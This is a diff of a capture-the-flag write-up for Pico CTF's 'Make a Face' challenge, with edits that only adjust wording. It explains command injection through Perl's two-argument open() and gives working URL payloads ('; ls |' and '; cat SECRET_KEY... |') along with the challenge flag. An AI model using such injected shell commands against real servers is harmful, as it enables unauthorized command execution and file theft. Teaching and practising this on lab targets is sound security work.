@@ -1,7 +1,7 @@
 ## Make a Face
 This challenge is from Pico CTF. We are given a link to a web application built using Perl. Our goal is to find any vulnerability in the perl script so that we can execute shell in the server. 
 
-After some googling, it is easy to find out that perl's (2-arguments form) ```open()``` function has a security flaw: luckily, several ```open()``` functions appear in the source code. 
+After some googling, it is easy to find out that perl's (2-arguments form) ```open(FILEHANDLER, filename)``` function has a security flaw: luckily, several ```open()``` functions appear in the source code. 
 ```
   open(HEAD,"head".$q->param('Head'));
   open(HAIR,"hair".$q->param('Hair'));
@@ -10,7 +10,7 @@ After some googling, it is easy to find out that perl's (2-arguments form) ```op
   open(EYES,"eyes".$q->param('Eyes'));
 ```
 
-The security flaw here is that the second argument of these ```open()``` functions comes from user input which is not sanitized at all. A normal usage through the browser would not affect the application; however, it is possible that a user sends arbitrary data that may not correspond with the data types specified in html and/or javascript. See the follwing code snippet that creates the form
+The security flaw here is that the second argument of these ```open()``` functions comes from user input which is not sanitized at all. A normal usage through the browser would not trigger any vulnerability; however, it is possible that a user sends arbitrary data that may not correspond with the data types specified in html and/or javascript. See the following code block that creates the form
 
 ```
 $q->table(
@@ -49,7 +49,7 @@ Now let's exploit. Simply feed the following URL.
 ```
 http://makeaface.picoctf.com/index.cgi?Head=%3Bls%20%7C&Hair=%3Bls%20%7C&Nose=%3Bls%20%7C&Mouth=%3Bls%20%7C&Eyes=%3Bls%20%7C
 ```
-This will return us a corrupted .bmp file. That's fine, just change the extension to .txt, and we should see the output of the "ls" command. The first result looks interesting
+This will return us a corrupted .bmp file. That's fine, just change the extension to .txt, and we can see the output of the "ls" command. The first result looks interesting
 ```
 SECRET_KEY_2b609783951a8665d8c67d721b52b0f8
 css.css
@@ -73,6 +73,5 @@ nose1.bmp
 nose2.bmp
 nose3.bmp
 ```
-So let's ```cat``` and see its content. This time, the command we want to feed is "; cat SECRET_KEY_2b609783951a8665d8c67d721b52b0f8 |", which is equivalent to "%3B%20cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8%20%7C". Do the same as before, and open the .txt file. The flag is 
-
-```why_did_we_stop_using_perl_again?```
+So let's ```cat``` and see its content. This time, the command we want to feed is ```; cat SECRET_KEY_2b609783951a8665d8c67d721b52b0f8 |```, which is equivalent to ```%3B%20cat%20SECRET_KEY_2b609783951a8665d8c67d721b52b0f8%20%7C```. Do the same as before, and open the txt file. 
+The flag is ```why_did_we_stop_using_perl_again?```
